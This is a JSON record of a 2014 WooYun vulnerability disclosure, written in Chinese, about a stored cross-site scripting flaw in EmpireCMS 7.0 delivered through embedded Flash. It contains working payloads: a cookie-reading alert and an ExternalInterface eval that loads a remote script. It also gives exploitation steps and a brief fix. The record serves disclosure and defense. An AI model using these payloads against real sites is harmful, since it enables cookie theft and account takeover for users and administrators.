{"id": 51756, "wybug_id": "wooyun-2014-073457", "wybug_title": "EmpireCMS存储型跨站", "wybug_corp": "EmpireCMS", "wybug_author": "路人甲", "wybug_date": "2014-08-25 18:42", "wybug_open_date": "2014-11-23 18:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： EmpireCMS通用存储型跨站，利用此漏洞可以攻击其它用户和系统管理员，盗取用户cookie或进行其它破坏操作。 详细说明：  1、涉及版本EmpireCMS 7.02、EmpireCMS开源系统对用户发表的文章和新闻内容过滤不严，导致存储型FLASH跨站，由于FLASH可以执行javascript脚本，利用此漏洞，攻击者可以加载本地脚本，盗取用户cookie以及其它信息，或者进行其它形式的攻击。   漏洞证明：  存在漏洞的模块为发表新闻和发表文章模块，以发表文章为例对漏洞进行证明。1、登录系统，进入会员中心---》投稿---》管理文章---》增加信息，填写文章内容，在新闻正文中点击flash按钮导入flash。\n\n将宽度和高度设置为0，增加了恶意代码的隐蔽性。xss.swf中包含的恶意代码为：getURL(\"javascript:alert(document.cookie)\");2、拦截请求，在<embed>标签中增加属性allowscriptaccess=\"always\".\n\n3、其它用户浏览文章信息，漏洞触发：\n\n4、使用Firebug查看页面源代码：\n\nflash标签成功插入，且允许执行脚本代码5、后台管理员浏览文章时，漏洞同样触发：\n\n6、修改xss.swf中的恶意代码为：import flash.external.ExternalInterface;ExternalInterface.call(\"eval\",\"d=document;e=d.createElement('script');e.src='http://127.0.0.1/eXploit.js';d.body.appendChild(e);\");//使用ExternalInterface.call()函数加载本地脚本文件，通过修改本地脚本文件内容我们可以进行盗取用户信息、钓鱼，编写蠕虫等操作。漏洞触发时，成功加载本地脚本：\n\n通过修改本地脚本代码，可以进行针对性的攻击   修复方案：  对<embed>标签的allowscriptaccess属性进行过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}